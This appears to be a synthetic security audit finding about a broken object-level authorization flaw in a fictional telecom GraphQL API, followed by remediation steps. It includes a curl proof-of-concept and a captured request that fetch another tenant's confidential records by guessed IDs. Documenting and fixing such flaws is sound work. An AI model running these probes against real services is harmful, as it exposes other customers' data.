# Security Analysis Report
**System:** SpectreNet Policy Control
**Domain:** Telecom / 5G Core
**Example ID:** GQL-0265
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.1 | ID in path without ownership check on `getResource` / `bulkResourceLookup` — attacker reads telecom policy records belonging to another tenant |

---

## Finding 1 — BOLA: ID Without Ownership Check on Resource Resolver (Pattern 1.1)

### Summary
The GraphQL API at `https://api.spectrenet-policy-co.example.com/graphql` exposes a `getResource` resolver that fetches by `resourceId` without verifying the JWT `tenantId` claim matches the object's `tenantId`. Per RISK-GQL-265, the Redis cache is keyed only by `resourceId` (no user dimension). The HAR shows the attacker sending a `bulkResourceLookup` query with multiple IDs; the server response returns data under the `getResource` key (see inconsistency note below).

**Context.txt inconsistency (documented):** The HAR request (§6.0 request body) uses `bulkResourceLookup(ids: ["R-2265","R-1265","R-3265"])`, while the HAR response returns data under the key `getResource`. These names conflict within context.txt. This analysis follows both artifacts faithfully.

**Note:** `x-request-id: req-92eee389` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 1.1 — ID in path without ownership check (BOLA)
**Affected endpoint:** `POST https://api.spectrenet-policy-co.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (bulk)**
```
POST https://api.spectrenet-policy-co.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { bulkResourceLookup(ids: [\"R-2265\", \"R-1265\", \"R-3265\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response — Victim Telecom Policy Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-e389",
      "ownerId": "other-user-92eee389",
      "data": {
        "sensitiveField": "CONFIDENTIAL-92eee389",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.spectrenet-policy-co.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { bulkResourceLookup(ids: [\"R-2265\",\"R-1265\",\"R-3265\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-e389, sensitiveField: CONFIDENTIAL-92eee389
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` claim before returning data.
2. Redis cache key must include user/tenant dimension: `resource:{tenantId}:{resourceId}`.
3. Bulk lookup must filter results to authenticated tenant's scope server-side.
